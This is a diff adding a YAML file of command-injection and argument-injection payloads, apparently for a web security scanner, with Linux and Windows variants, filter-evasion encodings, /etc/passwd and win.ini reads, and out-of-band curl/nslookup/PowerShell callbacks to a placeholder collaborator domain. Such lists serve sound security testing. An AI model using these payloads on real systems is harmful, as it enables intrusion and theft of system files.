@@ -1,0 +1,847 @@
+defaults:
+  vuln_type: cmdi
+  encoding: raw
+  source: ensphere
+
+payloads:
+  # ============================================================
+  # Linux — semicolon separator
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "; sleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Semicolon command separator + sleep. Confirm via response delay."
+    tags: [linux, semicolon, sleep, confirmation]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "; id"
+    notes: "Semicolon + id command. Look for uid= in response."
+    tags: [linux, semicolon, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "; whoami"
+    notes: "Semicolon + whoami. Look for username in response."
+    tags: [linux, semicolon, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "; cat /etc/passwd"
+    notes: "Read /etc/passwd via semicolon injection."
+    tags: [linux, semicolon, passwd]
+
+  # ============================================================
+  # Linux — pipe separator
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "| id"
+    notes: "Pipe command injection. Output of id piped."
+    tags: [linux, pipe, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "| whoami"
+    notes: "Pipe + whoami."
+    tags: [linux, pipe, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "| sleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Pipe + sleep for time-based confirmation."
+    tags: [linux, pipe, sleep]
+
+  # ============================================================
+  # Linux — backtick execution
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "`id`"
+    notes: "Backtick command substitution. Output injected into enclosing command."
+    tags: [linux, backtick, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "`sleep SLEEP_SECONDS`"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Backtick sleep for blind confirmation."
+    tags: [linux, backtick, sleep]
+
+  # ============================================================
+  # Linux — $() substitution
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "$(id)"
+    notes: "$() command substitution. Preferred over backticks in modern shells."
+    tags: [linux, dollar_paren, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "$(sleep SLEEP_SECONDS)"
+    placeholders: [SLEEP_SECONDS]
+    notes: "$() sleep for blind confirmation."
+    tags: [linux, dollar_paren, sleep]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "$(whoami)"
+    notes: "$() whoami substitution."
+    tags: [linux, dollar_paren, whoami]
+
+  # ============================================================
+  # Linux — && and || chaining
+  # ============================================================
+  - technique: command_chaining
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "&& sleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "AND chaining — executes if prior command succeeds."
+    tags: [linux, and_chain, sleep]
+
+  - technique: command_chaining
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "&& id"
+    notes: "AND chain + id."
+    tags: [linux, and_chain, id]
+
+  - technique: command_chaining
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "|| sleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "OR chaining — executes if prior command fails."
+    tags: [linux, or_chain, sleep]
+
+  - technique: command_chaining
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "|| id"
+    notes: "OR chain + id."
+    tags: [linux, or_chain, id]
+
+  # ============================================================
+  # Linux — newline separator
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "\nid"
+    notes: "Newline command separator. Works if input not sanitized for newlines."
+    tags: [linux, newline, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: "\nsleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Newline + sleep."
+    tags: [linux, newline, sleep]
+
+  # ============================================================
+  # Linux — OOB DNS
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "; nslookup COLLAB_DOMAIN"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB via nslookup. Confirm blind injection via DNS callback."
+    tags: [linux, oob, dns, nslookup]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "; curl http://COLLAB_DOMAIN/"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB via curl. Confirm blind injection."
+    tags: [linux, oob, curl]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "$(nslookup COLLAB_DOMAIN)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS via $() substitution."
+    tags: [linux, oob, dns, dollar_paren]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "; ping -c 1 COLLAB_DOMAIN"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB via ICMP ping with DNS resolution."
+    tags: [linux, oob, ping]
+
+  # ============================================================
+  # Linux — $IFS space-bypass obfuscation
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";cat$IFS/etc/passwd"
+    notes: "$IFS expands to whitespace in bash, bypasses filters that block literal spaces."
+    tags: [linux, obfuscation, ifs, passwd]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: ";sleep${IFS}SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "${IFS} brace-delimited variant for space bypass."
+    tags: [linux, obfuscation, ifs, sleep]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";id$IFS"
+    notes: "$IFS trailing space bypass with id."
+    tags: [linux, obfuscation, ifs, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";cat$'\\x20'/etc/passwd"
+    notes: "$'\\x20' ANSI-C quoting for space character. Bypasses space and $IFS filters."
+    tags: [linux, obfuscation, ansi_c_quote, passwd]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: ";sleep$'\\t'SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "$'\\t' ANSI-C tab character as argument separator."
+    tags: [linux, obfuscation, ansi_c_quote, tab, sleep]
+
+  # ============================================================
+  # Linux — wildcard / globbing bypass
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";/???/??t /???/p??s?d"
+    notes: "Glob pattern bypass. /???/??t resolves to /bin/cat, /???/p??s?d to /etc/passwd."
+    tags: [linux, obfuscation, glob, passwd]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";/???/i?"
+    notes: "Glob /???/i? resolves to /bin/id. Bypasses keyword blocklists."
+    tags: [linux, obfuscation, glob, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";/???/b??/w?o??i"
+    notes: "Glob /???/b??/w?o??i resolves to /usr/bin/whoami."
+    tags: [linux, obfuscation, glob, whoami]
+
+  # ============================================================
+  # Linux — brace expansion
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";{cat,/etc/passwd}"
+    notes: "Bash brace expansion. {cat,/etc/passwd} expands to cat /etc/passwd."
+    tags: [linux, obfuscation, brace_expansion, passwd]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";{whoami,}"
+    notes: "Brace expansion with trailing comma invokes whoami."
+    tags: [linux, obfuscation, brace_expansion, whoami]
+
+  # ============================================================
+  # Linux — environment variable extraction for characters
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";${PATH%%:*}id"
+    notes: "Extract first component of $PATH (usually /usr/bin/) then append id. Bypasses command keyword filters."
+    tags: [linux, obfuscation, env_var, path_extraction]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";a]=${IFS}&&cat${IFS}/etc/passwd"
+    notes: "Variable assignment trick combined with $IFS space bypass."
+    tags: [linux, obfuscation, env_var, ifs, passwd]
+
+  # ============================================================
+  # Linux — base64 decode execution
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";echo$IFS'aWQ='|base64$IFS-d|sh"
+    notes: "Base64-encoded 'id' decoded and piped to sh. Bypasses command keyword filters. aWQ= decodes to id."
+    tags: [linux, obfuscation, base64, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    payload: ";echo$IFS'c2xlZXAgNQ=='|base64$IFS-d|sh"
+    notes: "Base64-encoded 'sleep 5' piped to sh. Adjust encoded value to match SLEEP_SECONDS."
+    tags: [linux, obfuscation, base64, sleep]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";echo$IFS'Y2F0IC9ldGMvcGFzc3dk'|base64$IFS-d|sh"
+    notes: "Base64-encoded 'cat /etc/passwd' piped to sh."
+    tags: [linux, obfuscation, base64, passwd]
+
+  # ============================================================
+  # Linux — hex decode execution
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";printf '\\x69\\x64'|sh"
+    notes: "Hex-encoded 'id' via printf piped to sh. Evades string-based blocklists."
+    tags: [linux, obfuscation, hex, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";echo -e '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'|sh"
+    notes: "Hex-encoded 'cat /etc/passwd' via echo -e piped to sh."
+    tags: [linux, obfuscation, hex, passwd]
+
+  # ============================================================
+  # Linux — process substitution
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";cat <(id)"
+    notes: "Process substitution <(command). Output of id written to temp fd then read by cat."
+    tags: [linux, process_substitution, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";diff <(id) <(echo dummy)"
+    notes: "Process substitution in diff. Leaks id output via diff output."
+    tags: [linux, process_substitution, diff, id]
+
+  # ============================================================
+  # Linux — variable expansion and concatenation tricks
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";w'h'o'a'm'i"
+    notes: "Single-quote concatenation bypass. Shell concatenates w + h + o + a + m + i."
+    tags: [linux, obfuscation, quote_concat, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";w\"h\"o\"a\"m\"i"
+    notes: "Double-quote concatenation bypass. Shell concatenates through double quotes."
+    tags: [linux, obfuscation, dquote_concat, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";c\\at /et\\c/pas\\swd"
+    notes: "Backslash insertion bypass. Shell ignores backslashes before normal characters."
+    tags: [linux, obfuscation, backslash, passwd]
+
+  # ============================================================
+  # Linux — Ruby / Python / Perl one-liner injection
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";python3 -c 'import os;os.system(\"id\")'"
+    notes: "Python3 one-liner to execute id. Useful when common utilities are blocked."
+    tags: [linux, python, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";ruby -e 'puts `id`'"
+    notes: "Ruby one-liner with backtick command execution."
+    tags: [linux, ruby, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: ";perl -e 'print `id`'"
+    notes: "Perl one-liner with backtick execution."
+    tags: [linux, perl, id]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: ";python3 -c 'import socket;socket.getaddrinfo(\"COLLAB_DOMAIN\",80)'"
+    notes: "Python3 OOB DNS resolution. Confirms execution even if stdout is suppressed."
+    tags: [linux, python, oob, dns]
+    placeholders: [COLLAB_DOMAIN]
+
+  # ============================================================
+  # Windows — & separator
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    runtime: node
+    payload: "& timeout /t SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Windows ampersand separator + timeout."
+    tags: [windows, ampersand, timeout]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "& whoami"
+    notes: "Windows ampersand + whoami."
+    tags: [windows, ampersand, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "& dir"
+    notes: "Windows ampersand + dir to list files."
+    tags: [windows, ampersand, dir]
+
+  # ============================================================
+  # Windows — pipe
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "| whoami /all"
+    notes: "Windows pipe + whoami /all. Shows detailed user info including SID and groups."
+    tags: [windows, pipe, whoami]
+
+  # ============================================================
+  # Windows — && chaining
+  # ============================================================
+  - technique: command_chaining
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "&& whoami /all"
+    notes: "Windows AND chain + whoami /all."
+    tags: [windows, and_chain, whoami]
+
+  # ============================================================
+  # Windows — OOB
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    runtime: node
+    payload: "& nslookup COLLAB_DOMAIN"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Windows OOB DNS via nslookup."
+    tags: [windows, oob, dns]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    runtime: node
+    payload: "& ping -n 1 COLLAB_DOMAIN"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Windows OOB via ping."
+    tags: [windows, oob, ping]
+
+  # ============================================================
+  # Windows — set /p and for /f loops
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "& set /p x= <C:\\Windows\\win.ini"
+    notes: "Windows set /p reads first line of win.ini into variable. Leaks content in error or echo."
+    tags: [windows, set_p, file_read]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "& for /f %i in ('whoami') do echo %i"
+    notes: "Windows for /f loop captures whoami output. Works in cmd.exe context."
+    tags: [windows, for_loop, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "& type C:\\Windows\\win.ini"
+    notes: "Windows type command to read file contents. Equivalent to Linux cat."
+    tags: [windows, type, file_read]
+
+  # ============================================================
+  # Windows — PowerShell injection
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    runtime: node
+    payload: "& powershell -c \"whoami\""
+    notes: "Invoke PowerShell to run whoami. Bypasses cmd.exe-only filters."
+    tags: [windows, powershell, whoami]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: timing
+    risk: 3
+    runtime: node
+    payload: "& powershell -c \"Start-Sleep -Seconds SLEEP_SECONDS\""
+    placeholders: [SLEEP_SECONDS]
+    notes: "PowerShell Start-Sleep for time-based blind confirmation."
+    tags: [windows, powershell, sleep]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    runtime: node
+    payload: "& powershell -c \"Resolve-DnsName COLLAB_DOMAIN\""
+    placeholders: [COLLAB_DOMAIN]
+    notes: "PowerShell DNS resolution for OOB confirmation."
+    tags: [windows, powershell, oob, dns]
+
+  - technique: command_injection
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    runtime: node
+    payload: "& powershell -c \"Invoke-WebRequest http://COLLAB_DOMAIN/\""
+    placeholders: [COLLAB_DOMAIN]
+    notes: "PowerShell HTTP request for OOB exfiltration."
+    tags: [windows, powershell, oob, http]
+
+  # ============================================================
+  # Argument injection — git
+  # ============================================================
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "--version"
+    notes: "Argument injection probe. If value passed as CLI arg, --version may leak tool version."
+    tags: [argument, version, probe]
+
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "-o /tmp/pwned"
+    notes: "Argument injection to write file. Check if -o flag creates output file."
+    tags: [argument, file_write]
+
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "--output=/tmp/pwned"
+    notes: "Long-form argument injection."
+    tags: [argument, file_write]
+
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "--upload-pack='id'"
+    notes: "Git argument injection via --upload-pack. Executes arbitrary command during git clone/fetch."
+    tags: [argument, git, upload_pack]
+
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "--exec='id'"
+    notes: "Git argument injection via --exec. Used with git push --receive-pack or similar."
+    tags: [argument, git, exec]
+
+  # ============================================================
+  # Argument injection — tar
+  # ============================================================
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "--checkpoint=1 --checkpoint-action=exec=id"
+    notes: "Tar wildcard/argument injection. When used with wildcard expansion, checkpoint triggers command execution."
+    tags: [argument, tar, checkpoint]
+
+  - technique: argument_injection
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "--to-command=id"
+    notes: "Tar --to-command argument injection. Extracts files through a command pipe."
+    tags: [argument, tar, to_command]
+
+  # ============================================================
+  # Argument injection — rsync
+  # ============================================================
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "-e 'id'"
+    notes: "Rsync -e argument injection. Specifies remote shell command, can execute arbitrary code."
+    tags: [argument, rsync, remote_shell]
+
+  # ============================================================
+  # Argument injection — ffmpeg / ImageMagick
+  # ============================================================
+  - technique: argument_injection
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "-vf drawtext=text='%{localtime}':fontfile=/etc/passwd"
+    notes: "FFmpeg drawtext filter referencing /etc/passwd. May leak content in error messages."
+    tags: [argument, ffmpeg, file_read]
+
+  - technique: argument_injection
+    injection_surface: file_upload
+    evidence_type: content_match
+    risk: 3
+    payload: "ephemeral:fd:0|id"
+    notes: "ImageMagick delegate injection. Pipe character triggers command execution via delegate."
+    tags: [argument, imagemagick, delegate]
+
+  # ============================================================
+  # JSON body variants
+  # ============================================================
+  - technique: command_injection
+    injection_surface: json_body
+    evidence_type: timing
+    risk: 3
+    payload: "; sleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Semicolon injection via JSON body field."
+    tags: [linux, semicolon, sleep, json]
+
+  - technique: command_injection
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "$(id)"
+    notes: "$() substitution via JSON body."
+    tags: [linux, dollar_paren, id, json]
+
+  - technique: command_injection
+    injection_surface: json_body
+    evidence_type: dns_hit
+    risk: 3
+    payload: "$(nslookup COLLAB_DOMAIN)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS via JSON body."
+    tags: [linux, oob, dns, json]
+
+  # ============================================================
+  # URL-encoded variants
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: timing
+    risk: 3
+    payload: "%3B%20sleep%20SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "URL-encoded semicolon + sleep."
+    tags: [linux, url_encoded, sleep]
+
+  - technique: command_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: content_match
+    risk: 3
+    payload: "%7C%20id"
+    notes: "URL-encoded pipe + id."
+    tags: [linux, url_encoded, id]
+
+  - technique: command_injection
+    injection_surface: query
+    encoding: url
+    evidence_type: dns_hit
+    risk: 3
+    payload: "%24(nslookup%20COLLAB_DOMAIN)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "URL-encoded $() OOB DNS."
+    tags: [linux, url_encoded, oob, dns]
+
+  # ============================================================
+  # Double URL-encoded variants
+  # ============================================================
+  - technique: command_injection
+    injection_surface: query
+    encoding: double_url
+    evidence_type: timing
+    risk: 3
+    payload: "%253B%2520sleep%2520SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Double URL-encoded semicolon + sleep. Bypasses single-decode WAFs."
+    tags: [linux, double_url_encoded, sleep]
+
+  - technique: command_injection
+    injection_surface: query
+    encoding: double_url
+    evidence_type: content_match
+    risk: 3
+    payload: "%257C%2520id"
+    notes: "Double URL-encoded pipe + id."
+    tags: [linux, double_url_encoded, id]
+
+  # ============================================================
+  # Header injection
+  # ============================================================
+  - technique: command_injection
+    injection_surface: header
+    evidence_type: timing
+    risk: 3
+    payload: "; sleep SLEEP_SECONDS"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Command injection via HTTP header (User-Agent, Referer, etc.)."
+    tags: [linux, header, sleep]
+
+  - technique: command_injection
+    injection_surface: header
+    evidence_type: dns_hit
+    risk: 3
+    payload: "$(nslookup COLLAB_DOMAIN)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS via header injection."
+    tags: [linux, header, oob, dns]
+
+  # ============================================================
+  # Path injection surface
+  # ============================================================
+  - technique: command_injection
+    injection_surface: path
+    evidence_type: timing
+    risk: 3
+    payload: ";sleep${IFS}SLEEP_SECONDS;"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Command injection via URL path segment. Uses ${IFS} for space bypass in path context."
+    tags: [linux, path, ifs, sleep]
+
+  - technique: command_injection
+    injection_surface: path
+    evidence_type: dns_hit
+    risk: 3
+    payload: "$(nslookup${IFS}COLLAB_DOMAIN)"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "OOB DNS via path injection with ${IFS} space bypass."
+    tags: [linux, path, oob, dns, ifs]
+
+  - technique: command_injection
+    injection_surface: path
+    evidence_type: content_match
+    risk: 3
+    payload: "|id"
+    notes: "Pipe injection in URL path segment. No space needed."
+    tags: [linux, path, pipe, id]
+
+  # ============================================================
+  # Cookie injection surface
+  # ============================================================
+  - technique: command_injection
+    injection_surface: cookie
+    evidence_type: timing
+    risk: 3
+    payload: "$(sleep SLEEP_SECONDS)"
+    placeholders: [SLEEP_SECONDS]
+    notes: "Command substitution via cookie value. Targets apps that pass cookie values to shell."
+    tags: [linux, cookie, sleep]
+
+  - technique: command_injection
+    injection_surface: cookie
+    evidence_type: dns_hit
+    risk: 3
+    payload: "`nslookup COLLAB_DOMAIN`"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Backtick OOB DNS via cookie injection."
+    tags: [linux, cookie, oob, dns, backtick]
